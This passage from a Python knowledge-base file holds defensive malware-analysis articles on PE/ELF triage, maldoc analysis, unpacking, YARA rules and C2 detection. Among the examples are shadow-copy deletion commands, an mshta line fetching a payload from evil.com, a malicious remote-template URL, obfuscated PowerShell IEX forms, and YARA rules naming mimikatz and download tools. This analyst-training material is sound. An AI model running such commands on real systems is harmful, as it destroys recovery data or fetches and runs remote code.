"""Built-in KB data: Advanced Forensics & Malware Analysis Articles."""

MALWARE_FUNDAMENTALS = [
    {
        "title": "Static Analysis Workflow — PE Headers, Strings, Imports, Hashing",
        "tags": ["malware-analysis", "static-analysis", "pe-format", "strings", "hashing", "dfir"],
        "content": """# Static Analysis Workflow

## Step 1 — Hashing

```bash
md5sum malware.exe && sha256sum malware.exe
ssdeep malware.exe          # Fuzzy hash for variant matching
```

Submit SHA256 to VirusTotal, MalwareBazaar, Hybrid Analysis.

## Step 2 — File Type Identification

```bash
file malware.exe
xxd malware.exe | head -2
die malware.exe             # Detect-It-Easy: packer/compiler detection
```

Common magic bytes: PE=`4D 5A`, ELF=`7F 45 4C 46`, OLE=`D0 CF 11 E0`, ZIP=`50 4B 03 04`.

## Step 3 — PE Header Analysis

```python
import pefile, datetime, math

pe = pefile.PE('malware.exe')

# Compile timestamp
ts = pe.FILE_HEADER.TimeDateStamp
print("Compile time:", datetime.datetime.utcfromtimestamp(ts), "UTC")

# Section entropy (> 7.0 = packed/encrypted)
def entropy(data):
    if not data: return 0.0
    c = {}
    for b in data: c[b] = c.get(b,0)+1
    return -sum((v/len(data))*__import__('math').log2(v/len(data)) for v in c.values())

for s in pe.sections:
    name = s.Name.decode('utf-8', errors='replace').rstrip('\x00')
    ent = entropy(s.get_data())
    flag = " << PACKED" if ent > 7.0 else ""
    print(f"{name:12} entropy={ent:.2f}{flag}")
```

Key PE fields: `TimeDateStamp` (often spoofed), `Machine` (0x14C=x86, 0x8664=x64), section characteristics (RWX = suspicious), entry point location (in last section = packer stub), and overlay data (appended payload/config).

## Step 4 — String Extraction

```bash
strings -n 8 malware.exe          # ASCII, minimum 8 chars
strings -el malware.exe           # Unicode little-endian
floss malware.exe                 # Also decodes stack strings
```

Key patterns: `http://`, `https://`, `HKEY_`, `%APPDATA%`, `%TEMP%`, `cmd.exe`, `powershell`, mutex names, IP addresses.

## Step 5 — Import Analysis

```bash
python3 -c "
import pefile
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll.decode())
    for imp in entry.imports:
        if imp.name: print(' ', imp.name.decode())
"
```

High-risk import combinations:
- `VirtualAllocEx + WriteProcessMemory + CreateRemoteThread` = process injection
- `CryptEncrypt / BCryptEncrypt` = ransomware encryption
- `InternetOpen + InternetConnect` = HTTP C2
- `GetAsyncKeyState + SetWindowsHookEx` = keylogging
- `WNetAddConnection2 + NetShareEnum` = lateral movement

## Step 6 — Resource Extraction

```python
import pefile
pe = pefile.PE('malware.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for t in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        for n in t.directory.entries:
            for l in n.directory.entries:
                data = pe.get_data(l.data.struct.OffsetToData, l.data.struct.Size)
                if data[:2] == b'MZ': print("EMBEDDED PE!")
```

Also check for overlays: data appended after the last section (common config/payload location).
""",
    },
    {
        "title": "Dynamic Analysis — Sandbox Setup, Behavioral Indicators, API Monitoring",
        "tags": ["malware-analysis", "dynamic-analysis", "sandbox", "behavioral", "api-monitoring"],
        "content": """# Dynamic Analysis — Sandbox Setup and Behavioral Indicators

## VM Environment

- Guest OS: Windows 10 22H2 x64
- Network: Host-only + FakeNet-NG (simulated DNS/HTTP)
- Tools: ProcMon, Process Hacker, Wireshark, Regshot, API Monitor, x64dbg

```bash
# FakeNet-NG setup:
pip install fakenetsim
fakenetsim &
```

## ProcMon Filters

```
Include: Process Name = malware.exe
Exclude: Path contains Prefetch
Exclude: Operation = QueryNameInformationFile
Exclude: Result = BUFFER OVERFLOW
```

Use Regshot: take snapshot before execution, another after, compare for all registry changes.

## Behavioral Indicators

### Process Tree Red Flags

```
SUSPICIOUS PARENT-CHILD:
  WINWORD.EXE → powershell.exe       (Office spawning PS)
  svchost.exe → cmd.exe              (service spawning shell)
  explorer.exe → mshta.exe           (script host from explorer)

INJECTION INDICATORS:
  CreateRemoteThread into svchost.exe/explorer.exe
  Suspended child process + WriteProcessMemory
  Self-delete after execution
```

### File System

```
HIGH RISK LOCATIONS:
  %TEMP%, %APPDATA%, C:\ProgramData  → stage-2 drop zones
  C:\Windows\System32              → DLL hijack or masquerade

RANSOMWARE:
  Mass file rename/encryption
  README_DECRYPT.txt, !!!HOW_TO_DECRYPT!!!.txt
  vssadmin delete shadows /all /quiet
```

### Registry Persistence

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SYSTEM\CurrentControlSet\Services\<name>
HKCU\Software\Classes\CLSID\<guid>\InprocServer32  (COM hijack)
```

### Network

```
DNS to DGA domains (high NX rate, random-looking FQDNs)
HTTP beaconing: regular intervals, POST /gate.php, fake User-Agent
Custom port C2: 4444, 1337, 8080, 31337
Large outbound transfers (exfiltration)
```

## API Monitor Key Categories

```
Process:   CreateProcess, OpenProcess, CreateRemoteThread
Memory:    VirtualAllocEx, WriteProcessMemory, NtAllocateVirtualMemory
Network:   WSAConnect, connect, InternetOpen, HttpSendRequest
Registry:  RegSetValueEx, RegCreateKeyEx
Crypto:    CryptEncrypt, BCryptEncrypt, CryptGenKey
```

## Noriben Automated Collection

```bash
python Noriben.py --timeout 120 --cmd malware.exe
# Produces: Noriben_Report.txt (filtered IOCs), Noriben_IOCs.txt
```

## CAPE Sandbox

```bash
curl -X POST http://cape/tasks/create/file -F file=@malware.exe
curl http://cape/tasks/report/<id>/json
# Auto-extracts configs for: Emotet, QakBot, Cobalt Strike, Redline
```

## Behavioral Report Template

```
Sample: malware.exe | SHA256: ... | Duration: 120s

PROCESS TREE:
  malware.exe (1234) → cmd.exe (1456) → powershell.exe (1678) -EncodedCommand <b64>

DROPS:
  %APPDATA%\svchost32.exe  (MD5: xx)
  C:\ProgramData\update.bat

REGISTRY:
  SET HKCU\...\Run\Updater = "%APPDATA%\svchost32.exe"

NETWORK:
  DNS: update.evil.com → NXDOMAIN
  HTTP POST: http://185.220.x.x/gate.php
    UA: Mozilla/5.0 (compatible; MSIE 9.0)
    Body: id=ABC123&os=Win10

VERDICT: RAT with HTTP C2. Persistence via Run key.
```
""",
    },
    {
        "title": "Malware Types — Ransomware, RATs, Wipers, Cryptominers, Rootkits",
        "tags": ["ransomware", "rat", "wiper", "cryptominer", "rootkit", "malware-types"],
        "content": """# Malware Types Reference

## Ransomware

Modern ransomware operates as RaaS (Ransomware-as-a-Service). Affiliates conduct intrusions; developers take 20–30% cut.

### Attack Chain

```
Initial Access → Persistence → PrivEsc → Lateral Movement →
Defense Evasion → Exfiltration (double extortion) → Encryption → Ransom Note
```

### Universal IOCs

```powershell
# Nearly all modern ransomware deletes shadow copies:
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
```

### Encryption Schemes

| Family | Algorithm |
|---|---|
| WannaCry | RSA-2048 wraps AES-128-CBC per file |
| Ryuk | RSA-4096 wraps AES-256 |
| LockBit 3.0 | Curve25519 ECDH + AES-128 |
| BlackCat/ALPHV | ChaCha20 + RSA-4096 (written in Rust) |

## Remote Access Trojans (RATs)

Full remote control: shell, file management, keylogging, screen capture, credential theft.

| Family | Language | Notes |
|---|---|---|
| AsyncRAT | .NET | Open source, widely abused |
| QuasarRAT | .NET | GitHub project |
| Cobalt Strike | Java | Commercial; dominant in enterprise intrusions |
| Sliver | Go | Open-source C2 alternative to CS |

```bash
netstat -ano | findstr ESTABLISHED   # Find unusual outbound connections
schtasks /query /fo LIST /v | findstr "Task To Run"  # Suspicious scheduled tasks
```

## Wipers

Destroy data irreversibly — geopolitical attack tool, no recovery intended.

| Family | Context | Technique |
|---|---|---|
| NotPetya | Ukraine 2017 | Overwrites MBR, fake ransomware wrapper |
| WhisperGate | Ukraine 2022 | MBR overwrite + stage-2 file corruptor |
| HermeticWiper | Ukraine 2022 | Abuses EaseUS Partition driver |
| AcidRain | Viasat 2022 | Firmware wiper for embedded Linux modems |

## Cryptominers

Mine Monero (XMR) using victim CPU/GPU. Common in cloud misconfiguration exploits.

```bash
ps aux | grep -i "xmrig\|minerd\|cpuminer"
netstat -ano | findstr ":3333\|:4444\|:14444"  # Stratum mining pool ports
```

```yara
rule XMRig { strings: $p="pool.supportxmr.com" $s="stratum+tcp://" condition: any of them }
```

## Rootkits

| Type | Privilege | Example |
|---|---|---|
| User-mode | Ring 3 | LD_PRELOAD hooks (Linux), IAT/EAT hooks |
| Kernel-mode | Ring 0 | TDL4, ZeroAccess, DKOM |
| Bootkit | Pre-OS | LoJax (BIOS) |
| UEFI | Ring -2 | CosmicStrand, MosaicAggressor |

```bash
# Kernel rootkit detection via memory forensics:
vol.py -f mem.raw windows.pslist   # ActiveProcessLinks traversal
vol.py -f mem.raw windows.psscan   # Pool-tag scan (bypasses DKOM)
# PIDs in psscan but not pslist = DKOM-hidden process = rootkit indicator
```
""",
    },
    {
        "title": "PE File Format Deep Dive — Sections, IAT, Resources",
        "tags": ["pe-format", "sections", "iat", "static-analysis", "malware-analysis"],
        "content": """# PE File Format Deep Dive

## File Layout

```
DOS Header (64b)  →  PE Signature (4b)  →  COFF File Header (20b)
→  Optional Header (224/240b)  →  Section Table (40b/section)
→  Section Data  →  Overlay (optional)
```

## Key Header Fields

```c
// COFF File Header
WORD  Machine;        // 0x14C=x86, 0x8664=x64, 0xAA64=ARM64
WORD  NumberOfSections;
DWORD TimeDateStamp;  // Compile time Unix timestamp (often spoofed)
WORD  Characteristics; // DLL, EXE, stripped, etc.

// Optional Header
DWORD AddressOfEntryPoint; // RVA where execution begins
DWORD ImageBase;           // Preferred load address
WORD  Subsystem;           // 2=GUI, 3=Console, 1=Native driver
WORD  DllCharacteristics;  // 0x0040=ASLR, 0x0100=DEP, 0x4000=CFG
```

## Section Table

```c
typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[8];       // Null-padded name
    DWORD VirtualSize;   // In-memory size
    DWORD VirtualAddress;// RVA in memory
    DWORD SizeOfRawData; // On-disk size
    DWORD Characteristics; // Permission flags
};

// Characteristics:
// 0x20000000 = Execute; 0x40000000 = Read; 0x80000000 = Write
// RWX = 0xE0000020 = RED FLAG (injected/unpacked code)
```

### Common Sections

| Name | Contents |
|---|---|
| .text | Executable code |
| .data | Initialized global data |
| .rdata | Read-only data, imports |
| .rsrc | Resources (icons, embedded files) |
| .reloc | Base relocations |
| UPX0/UPX1 | UPX packer |
| .themida | Themida/WinLicense protector |

## Section Entropy Analysis

```python
import pefile, math
def entropy(data):
    if not data: return 0.0
    c = {}
    for b in data: c[b] = c.get(b,0)+1
    return -sum((v/len(data))*math.log2(v/len(data)) for v in c.values())

pe = pefile.PE('malware.exe')
for s in pe.sections:
    name = s.Name.decode('utf-8', errors='replace').rstrip('\x00')
    ent  = entropy(s.get_data())
    print(f"{name:12} {ent:.3f}" + (" << PACKED" if ent > 7.0 else ""))
# > 7.0 with RWX = very high confidence packed
```

## Import Address Table

```python
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"DLL: {entry.dll.decode()}")
    for imp in entry.imports:
        name = imp.name.decode() if imp.name else f"ord#{imp.ordinal}"
        print(f"  [{hex(imp.address)}] {name}")
```

### Suspicious Import Patterns

| Imports | Capability |
|---|---|
| VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | Injection |
| CryptEncrypt / BCryptEncrypt | Encryption (ransomware) |
| InternetOpen + HttpSendRequest | HTTP C2 |
| connect + send + recv | Raw TCP C2 |
| SetWindowsHookEx + GetAsyncKeyState | Keylogger |

## Resource Analysis

```python
pe = pefile.PE('malware.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for t in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        for n in t.directory.entries:
            for l in n.directory.entries:
                data = pe.get_data(l.data.struct.OffsetToData, l.data.struct.Size)
                magic = data[:4].hex()
                print(f"Resource {l.data.struct.OffsetToData:#x}: {magic}")
                # 4d5a = PE, 504b0304 = ZIP, d0cf11e0 = OLE
```

## Overlay Detection

```python
pe = pefile.PE('malware.exe')
last = pe.sections[-1]
overlay_offset = last.PointerToRawData + last.SizeOfRawData
with open('malware.exe','rb') as f:
    f.seek(overlay_offset)
    ov = f.read()
if ov:
    print(f"Overlay: {len(ov)} bytes at 0x{overlay_offset:X}, magic: {ov[:8].hex()}")
```

## PE Anomaly Checklist

```
[ ] TimeDateStamp zeroed or in future
[ ] NumberOfSections == 0 or > 20
[ ] Entry point outside .text section
[ ] Sections with RWX permission
[ ] .text entropy > 7.0
[ ] < 10 total imports (likely packed)
[ ] Resources contain embedded PE (MZ magic in resource data)
[ ] Overlay data present (check for MZ, PK, config patterns)
[ ] DLL with no exports, or exports named Install/ServiceMain
```
""",
    },
    {
        "title": "ELF Binary Analysis for Linux Malware",
        "tags": ["elf", "linux-malware", "static-analysis", "malware-analysis", "reverse-engineering"],
        "content": """# ELF Binary Analysis for Linux Malware

## ELF Identification

Magic bytes: `7F 45 4C 46` (`\x7fELF`)

```bash
file malware.elf
# ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
# "stripped" = symbol table removed; harder to analyze
# "statically linked" = all libs bundled = common in IoT botnets

readelf -h malware.elf    # Architecture, entry point, ELF type
readelf -S malware.elf    # Section list with types and sizes
readelf -d malware.elf | grep NEEDED  # Runtime library deps
ldd malware.elf            # Library resolution (blank = static)
```

## Symbol and Import Analysis

```bash
# Imported symbols (UND = imported from shared library):
readelf -s malware.elf | grep "UND"

# All global symbols:
readelf -s malware.elf | grep "GLOBAL"
nm malware.elf 2>/dev/null

# PLT stubs for dynamic calls:
objdump -d malware.elf | grep "@plt"
```

## Security Properties

```bash
checksec --file=malware.elf
# RELRO: Full = GOT read-only (blocks GOT overwrites)
# STACK CANARY: present = stack overflow harder
# NX: enabled = non-executable stack
# PIE: enabled = ASLR applies to binary
# Malware: typically minimal security flags, often no PIE
```

## String Extraction

```bash
strings malware.elf
strings -n 6 malware.elf
floss malware.elf          # Obfuscated/stack strings

# IoC patterns:
grep -E "https?://|/tmp/|/dev/shm/|crontab|wget|curl|chmod 777|iptables"
# /tmp/ and /dev/shm/ = dropper staging areas
# /dev/shm/ = RAM filesystem, no disk artifact
```

## Mirai Botnet Analysis

```bash
# Indicators of Mirai-family malware:
# - Statically linked (portable across MIPS/ARM/x86)
# - Embedded 62-entry default credential list
# - Scans random IPs port 23/2323 (telnet brute force)
# - Self-propagation + DDoS modules

strings mirai.arm | grep -E "root:|admin:|default:|/bin/busybox"
# Credential list visible in static strings
```

## LD_PRELOAD Rootkits

```bash
# Injected into every process via /etc/ld.so.preload
# Hooks: readdir (hides files/processes), fopen/read (hides connections)

# Detection:
cat /etc/ld.so.preload
cat /proc/<pid>/environ | tr '\0' '\n' | grep LD_PRELOAD

# Cross-view detection:
ls /proc/ | sort > readdir_output.txt
ls -d /proc/[0-9]* | sort > direct_proc.txt
diff readdir_output.txt direct_proc.txt
# Lines only in direct_proc = processes hidden by rootkit
```

## Dynamic Analysis

```bash
strace -f -e trace=network,file,process ./malware.elf 2>&1 | tee strace.log
ltrace ./malware.elf 2>&1 | tee ltrace.log

tcpdump -i any -w cap.pcap &
./malware.elf
kill %1

# eBPF non-intrusive tracing:
bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("exec: %s\n", str(args->filename)); }'
```

## YARA Detection

```yara
rule Suspicious_ELF_Dropper {
    strings:
        $elf   = { 7F 45 4C 46 }
        $tmp   = "/tmp/"
        $shm   = "/dev/shm/"
        $wget  = "wget" nocase
        $curl  = "curl" nocase
        $chmod = "chmod 777"
    condition:
        $elf at 0 and filesize > 500KB and 3 of ($tmp,$shm,$wget,$curl,$chmod)
}
```
""",
    },
    {
        "title": "Document Malware — Macro Analysis, OLE Streams, VBA Stomping",
        "tags": ["document-malware", "macro-analysis", "ole", "vba", "maldoc"],
        "content": """# Document Malware Analysis

## File Type Identification

```bash
xxd malware.doc | head -2
# D0 CF 11 E0 = OLE (old .doc/.xls/.ppt)
# 50 4B 03 04 = ZIP (new .docx/.xlsx/.docm)

file malware.*
```

## oletools Suite

```bash
pip install oletools

oleid malware.doc          # Quick triage: macros? encrypted? Flash?
olevba malware.doc         # Extract + analyze VBA source code
olevba --deobf malware.doc # Attempt deobfuscation
olemeta malware.doc        # Author, company, revision count
rtfobj malware.rtf         # Extract embedded objects from RTF
```

### olevba Key Indicators

| Type | Keyword | Significance |
|---|---|---|
| AutoExec | AutoOpen, Document_Open | Runs without user interaction |
| Suspicious | Shell, WScript.Shell | System command execution |
| Suspicious | CreateObject + powershell | PowerShell invocation |
| Suspicious | Base64 strings | Encoded payload |
| IOC | http://... | C2 or payload URL |

## VBA Deobfuscation

```vba
' Concatenation:
s = "pow" & "er" & "she" & "ll"   → "powershell"

' Chr() encoding:
Chr(80) & Chr(111) & Chr(119) ...  → "Pow..."
```

```python
# Decode Chr() sequence:
python3 -c "print(''.join(chr(x) for x in [80,111,119,101,114,115,104,101,108,108]))"
```

```bash
# Decode -EncodedCommand (UTF-16LE base64):
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode('utf-16-le'))" "<b64>"
```

## VBA Stomping

The compiled p-code (bytecode) retains malicious logic while the human-readable source is replaced with benign code. Most AV scans only the source.

```bash
# Detection:
olevba malware.doc | grep -i "stomp"

# Dump p-code:
pip install pcodedmp
pcodedmp malware.doc

# If source = "Sub AutoOpen() End Sub" but pcodedmp shows Shell/WScript calls
# → stomped macro detected
```

## Template Injection (.docx)

```bash
unzip malware.docx -d doc/
cat doc/word/_rels/document.xml.rels
# <Relationship Type=".../attachedTemplate"
#   Target="http://attacker.com/evil.dotm"/>
# Word fetches template on open, executes its macros
```

## Process Tree to Monitor

```
WINWORD.EXE
  └─ cmd.exe
       └─ powershell.exe -WindowStyle Hidden -EncodedCommand <b64>
            └─ mshta.exe http://evil.com/payload.hta
```

## YARA Detection

```yara
rule Maldoc_AutoExec_Shell {
    strings:
        $ole   = { D0 CF 11 E0 A1 B1 1A E1 }
        $auto1 = "AutoOpen" nocase
        $auto2 = "Document_Open" nocase
        $auto3 = "Workbook_Open" nocase
        $shell = "Shell" nocase
        $ps    = "powershell" nocase
        $wsh   = "WScript.Shell" nocase
    condition:
        $ole at 0 and 1 of ($auto*) and 2 of ($shell,$ps,$wsh)
}
```
""",
    },
    {
        "title": "Packing and Obfuscation — UPX, Custom Packers, Entropy Analysis",
        "tags": ["packing", "upx", "entropy", "obfuscation", "malware-analysis"],
        "content": """# Packing and Obfuscation

## Detecting Packed Samples

```bash
die malware.exe     # Detect-It-Easy: identifies packer, compiler, protector
strings malware.exe | grep -i upx
```

Shannon entropy thresholds: 5.0–6.5 = normal compiled code; > 7.0 = compressed/encrypted; > 7.2 = strong packing indicator.

```python
import pefile, math

def entropy(data):
    if not data: return 0.0
    c = {}
    for b in data: c[b] = c.get(b,0)+1
    return -sum((v/len(data))*math.log2(v/len(data)) for v in c.values())

pe = pefile.PE('malware.exe')
for s in pe.sections:
    name = s.Name.decode('utf-8', errors='replace').rstrip('\x00')
    ent  = entropy(s.get_data())
    print(f"{name:12} entropy={ent:.3f}" + (" << HIGH" if ent > 7.0 else ""))
```

Additional indicators: fewer than 10 imports, entry point in last section, VirtualSize >> SizeOfRawData (runtime expansion), unnamed sections.

## UPX

```bash
# Identify: section names UPX0/UPX1, or strings "UPX!"
strings malware.exe | grep -i upx

# Unpack:
upx -d malware.exe -o unpacked.exe

# If header tampered (prevents upx -d):
# 1. Restore UPX0/UPX1 section names in hex editor
# 2. Or: run in debugger, memory BP on execution when UPX sections fill,
#         reach OEP, dump with Scylla
```

UPX stub: decompress UPX1 → UPX0 buffer, fix imports via GetProcAddress, jump to OEP.

## Custom Packers — OEP Finding

```
x64dbg workflow:
1. Run until initial setup
2. Alt+M → find RWX section (unpacked payload)
3. Right-click section → Set Memory Breakpoint on Execution
4. F9 → packer jumps to OEP → debugger breaks
5. Plugins → Scylla → IAT Autosearch → Get Imports → Dump + Fix Dump
6. Analyze unpacked binary statically
```

### XOR Decryptor Pattern

```asm
mov ecx, length
mov esi, packed_data
mov al,  key
.loop:
    xor [esi], al
    inc esi
    loop .loop
jmp packed_data   ; OEP jump
```

### RC4 Recognition

```python
# KSA pattern: two consecutive 256-iteration loops
# Loop 1: S[i] = i (trivial init)
# Loop 2: j = (j + S[i] + key[i%len]) % 256; swap(S[i], S[j])
# Then PRGA streaming loop

def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i = (i+1)%256; j = (j+S[i])%256; S[i],S[j] = S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)
```

## .NET Obfuscation

```bash
die malware.exe  # or: strings malware.exe | grep mscoree.dll

# De-obfuscate ConfuserEx (most common):
de4dot.exe malware.exe -o deobfuscated.exe
de4dot.exe --detect malware.exe

# Decompile with dnSpy or ILSpy
```

## PowerShell Obfuscation

```powershell
# 1. Base64 encoded command:
powershell.exe -EncodedCommand <Base64>

# 2. Tick marks (ignored by parser):
po`wer`she`ll -nop -w hi`dden -c "IEX(...)"

# 3. String reverse:
$cmd = "llehsrewop"; iex ($cmd[-1..-($cmd.length)] -join "")
```

```bash
# Decode -EncodedCommand:
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode('utf-16-le'))" "<b64>"
```
""",
    },
    {
        "title": "YARA Rules — Writing, Testing, and Deploying Detection Signatures",
        "tags": ["yara", "detection", "signatures", "malware-analysis", "threat-hunting"],
        "content": """# YARA Rules — Writing, Testing, and Deploying

## Rule Structure

```yara
rule RuleName : tags {
    meta:
        author = "SOC Team"
        date   = "2025-01-15"
        description = "Detects XYZ malware"
        score  = 75

    strings:
        $s1 = "literal string"
        $s2 = "case insensitive" nocase
        $s3 = "utf16 string" wide
        $s4 = "both" ascii wide
        $h1 = { 4D 5A 90 00 }              // Hex pattern
        $h2 = { 4D [2-4] 5A ?? 90 }        // Wildcards
        $h3 = { 4D (5A|5B) 90 }            // Alternation
        $r1 = /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
        $x1 = "powershell" xor             // All single-byte XOR variants
        $b1 = "IEX" base64                 // Base64-encoded variant

    condition:
        uint16(0) == 0x5A4D and
        filesize < 2MB and
        2 of ($s*) and $h1
}
```

## Condition Reference

```yara
2 of ($s*)           // At least 2 of s-prefixed strings
all of ($h*)         // All h-prefixed strings
any of them          // Any defined string
$s at 0              // String at file offset 0
$s in (0..100)       // String in first 100 bytes
#s > 3               // More than 3 occurrences
@s[1]                // Offset of first match
uint16(0) == 0x5A4D  // PE magic at offset 0
uint32(0) == 0x464C457F  // ELF magic

// PE module conditions:
pe.imports("kernel32.dll", "VirtualAllocEx")
pe.number_of_sections > 5
pe.sections[0].characteristics & pe.SECTION_MEM_WRITE
pe.timestamp == 0
```

## Production Rules

### Cobalt Strike Beacon

```yara
rule CobaltStrike_Beacon {
    meta: description = "CS staged beacon indicators"
    strings:
        $shellcode = { FC E8 [4-8] 60 89 E5 }
        $pipe1 = "\\.\pipe\msagent_" wide
        $pipe2 = "\\.\pipe\MSSE-" wide
        $cfg   = { 00 01 00 01 00 02 }
    condition:
        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and
        (2 of ($*))
}
```

### Process Injection

```yara
rule ProcessInjection_Classic {
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("kernel32.dll", "VirtualAllocEx") and
        pe.imports("kernel32.dll", "WriteProcessMemory") and
        (pe.imports("kernel32.dll", "CreateRemoteThread") or
         pe.imports("kernel32.dll", "QueueUserAPC"))
}
```

### Ransomware Generic

```yara
rule Ransomware_Generic {
    strings:
        $vss1 = "vssadmin" nocase
        $vss2 = "delete shadows" nocase
        $bcd  = "bcdedit" nocase
        $note1 = "decrypt" nocase fullword
        $note2 = "bitcoin" nocase fullword
        $note3 = "ransom" nocase fullword
    condition:
        uint16(0) == 0x5A4D and
        (2 of ($vss*,$bcd) or 3 of ($note*))
}
```

### Mimikatz

```yara
rule Mimikatz {
    strings:
        $s1 = "mimikatz" nocase
        $s2 = "sekurlsa" nocase
        $s3 = "lsadump::sam" nocase
        $s4 = "privilege::debug" nocase
        $s5 = "sekurlsa::logonpasswords" nocase
    condition: any of them
}
```

## Testing

```bash
# Single file:
yara -r rule.yar malware.exe

# Directory:
yara -r rules/ /path/to/samples/

# False positive check:
yara -r rule.yar /Windows/System32/ 2>/dev/null | wc -l
# Should be 0

# Python integration:
python3 -c "
import yara
rules = yara.compile('rule.yar')
matches = rules.match('malware.exe')
for m in matches:
    print(m.rule, [(s.identifier, s.instances[0].offset) for s in m.strings])
"
```

## Deployment

```yaml
# Velociraptor VQL hunt:
SELECT * FROM hunt_results(hunt_id=HuntYARA(
  artifacts=["Windows.Detection.Yara.Process"],
  parameters=dict(YaraRule="rule Bad { strings: $s=\"malware_ioc\" condition: $s }")
))
```

```bash
# MISP export:
curl -H "Authorization: <key>" https://misp/attributes/restSearch/returnFormat:yara -o rules.yar
```

## Maintenance

```yara
meta:
    version      = "2.1"
    last_modified = "2025-03-10"
    status       = "production"   // draft / testing / production / retired
// Performance: put filesize/uint16 conditions first (cheap); avoid unbounded regex
```
""",
    },
    {
        "title": "Malware C2 Communication Patterns — HTTP, DNS, Custom Protocols",
        "tags": ["c2", "command-and-control", "http", "dns", "malware-analysis"],
        "content": """# Malware C2 Communication Patterns

## HTTP/HTTPS C2

### Beaconing Characteristics

```
POST /gate.php HTTP/1.1
Host: update.evil-domain.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)
Content-Type: application/x-www-form-urlencoded

id=ABC123&os=Win10&av=Defender&data=<encrypted>
```

Detection indicators:
- Regular intervals (low jitter = automated beacon)
- Consistent response Content-Length
- User-Agent mismatch (claims IE 9 on Win10)
- Connections to newly-registered or bulletproof hosting
- POST to generic paths (/gate.php, /connect, /update)

```bash
# JA3 TLS fingerprinting (Zeek):
zeek-cut ja3 server_name < ssl.log | sort | uniq -c | sort -rn
# CS default JA3: 72a589da586844d7f0818ce684948eea
curl "https://ja3er.com/search/<ja3_hash>"

# JARM server fingerprint:
python jarm.py evil-c2.com 443
```

## DNS C2

```
# Subdomain exfiltration:
MFRA.OBQXE.YLBMFUYDSMFZGK43.c2.evil.com  (base32-encoded data in labels)

# TXT record commands:
dig TXT cmd.evil.com +short
# "Y21kOiBpcGNvbmZpZw==" = base64("cmd: ipconfig")
```

```bash
# Detection via Zeek DNS logs:
# Long FQDNs (> 60 chars):
zeek-cut query < dns.log | awk '{if(length>60) print}' | sort -u

# High entropy subdomains (Shannon entropy > 3.5):
zeek-cut query < dns.log | awk -F. '{print $1}' | python3 -c "
import sys, math
for line in sys.stdin:
    s = line.strip()
    if len(s) < 8: continue
    c = {}
    for ch in s: c[ch] = c.get(ch,0)+1
    ent = -sum((v/len(s))*math.log2(v/len(s)) for v in c.values())
    if ent > 3.5: print(f'{ent:.2f} {s}')
" | sort -rn
```

## Custom Binary Protocols

```python
# Identify magic bytes and structure from pcap:
from scapy.all import rdpcap, TCP, IP, Raw

packets = rdpcap("session.pcap")
streams = {}
for pkt in packets:
    if IP in pkt and TCP in pkt and Raw in pkt:
        conn = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        streams.setdefault(conn, []).append(bytes(pkt[Raw]))

for conn, payloads in streams.items():
    print(f"{conn[0]}:{conn[1]} -> {conn[2]}:{conn[3]}")
    for i, p in enumerate(payloads[:3]):
        print(f"  [{i}] {p[:32].hex()}")
# Consistent first 4 bytes = magic; bytes 4-5 = type; 6-7 = length
```

## Domain Fronting

```
TLS SNI: legitimate-cdn.cloudfront.net
HTTP Host header: c2.attacker.com (inside TLS)
CDN routes to attacker backend based on Host header
Defenders see only cloudfront.net in logs

Detection: compare SNI (ssl.log) vs Host header (http.log) for mismatches
```

## C2 Infrastructure Pivoting

```bash
# Passive DNS — other domains at same IP:
curl "https://api.securitytrails.com/v1/ips/<IP>/addresses" -H "apikey: <key>"

# Shodan — servers with identical TLS fingerprint:
shodan search "ssl.jarm:<jarm_hash>"

# Certificate pivoting (all domains sharing org name):
curl "https://search.censys.io/api/v2/certificates/search?q=parsed.subject.organization:<org>"
```

## Traffic Decryption

```python
# AES-CBC once key extracted:
from Crypto.Cipher import AES
key = bytes.fromhex("aabbccddeeff00112233445566778899")
iv  = bytes.fromhex("00000000000000000000000000000000")
ct  = bytes.fromhex("<captured_traffic>")
pt  = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)

# RC4:
def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i%len(key)]) % 256; S[i],S[j] = S[j],S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i=(i+1)%256; j=(j+S[i])%256; S[i],S[j]=S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)
```
""",
    },
]


REVERSE_ENGINEERING = [
    {
        "title": "x86/x64 Assembly for Reverse Engineers — Essential Instructions",
        "tags": ["assembly", "x86", "x64", "reverse-engineering", "malware-analysis"],
        "content": """# x86/x64 Assembly for Reverse Engineers

## Register Reference

### x86 General Purpose Registers

| Register | Primary Use |
|---|---|
| EAX | Return values, arithmetic |
| EBX | Base pointer (callee-saved) |
| ECX | Loop counter, arg 1 (fastcall) |
| EDX | Arithmetic overflow, arg 2 (fastcall) |
| ESI | Source pointer in string ops |
| EDI | Destination pointer |
| ESP | Stack pointer |
| EBP | Frame pointer |
| EIP | Instruction pointer |

### x64 Extensions

